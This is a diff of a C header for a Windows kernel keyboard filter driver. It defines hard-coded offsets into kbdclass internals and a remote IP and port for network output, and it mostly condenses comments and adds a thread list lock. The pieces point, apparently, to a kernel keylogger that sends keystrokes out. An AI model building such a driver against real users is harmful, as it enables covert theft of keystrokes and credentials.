@@ -1,35 +1,20 @@
 /*++
-
-Module Name:
-    driver.h
-
-Abstract:
-    Common definitions, structures, and declarations for the keyboard
-    filter driver. This header provides the core infrastructure for
-    intercepting and processing keyboard input data.
-
-Environment:
-    Kernel mode only.
-
+Module Name: driver.h
+Abstract: Common definitions, structures, and declarations for the keyboard filter driver
+Environment: Kernel mode only.
 --*/
 
 #pragma once
 
-//
 // System Headers
-//
 #include <ntifs.h>
 #include <ntddk.h>
 #include <ntddkbd.h>
 
-//
 // External References
-//
 extern POBJECT_TYPE* IoDriverObjectType;
 
-//
 // Architecture-Specific Offsets into KBDCLASS Device Extension
-//
 #ifdef _WIN64
     #define KBDCLASS_REMOVELOCK_OFFSET      0x20
     #define KBDCLASS_SPINLOCK_OFFSET        0xA0
@@ -40,9 +25,7 @@ extern POBJECT_TYPE* IoDriverObjectType;
     #define KBDCLASS_READQUEUE_OFFSET       0x70
 #endif
 
-//
 // Debug output - compiled out in Release builds
-//
 #ifdef DBG
     #define KBDTRACE_ROUTINES               0x00000001
     #define KBDTRACE_OPERATION_STATUS       0x00000002
@@ -62,20 +45,14 @@ extern POBJECT_TYPE* IoDriverObjectType;
     #define KBD_INFO(_fmt, ...)             ((void)0)
 #endif
 
-//
 // Pool Tag for Memory Allocations
-//
 #define KBDDRIVER_POOL_TAG      'dbKK'
 
-//
 // Network Configuration
-//
 #define KBDDRIVER_REMOTE_IP         L"127.0.0.1"
 #define KBDDRIVER_REMOTE_PORT       L"31415"
 
-//
 // Driver Structures
-//
 
 typedef struct _KBDDRIVER_KEYBOARD_OBJECT
 {
@@ -103,15 +80,16 @@ typedef struct _KBDDRIVER_DEVICE_EXTENSION
     KSPIN_LOCK          KbdObjSpinLock;
     LIST_ENTRY          KbdObjListHead;
     
+    KSPIN_LOCK          ThreadListLock;
+    LIST_ENTRY          ThreadListHead;
+    
     PDRIVER_OBJECT      KbdDriverObject;
     
     BOOLEAN             IsUnloading;
     
 } KBDDRIVER_DEVICE_EXTENSION, *PKBDDRIVER_DEVICE_EXTENSION;
 
-//
 // Function Declarations
-//
 
 NTSTATUS
 DriverEntry(
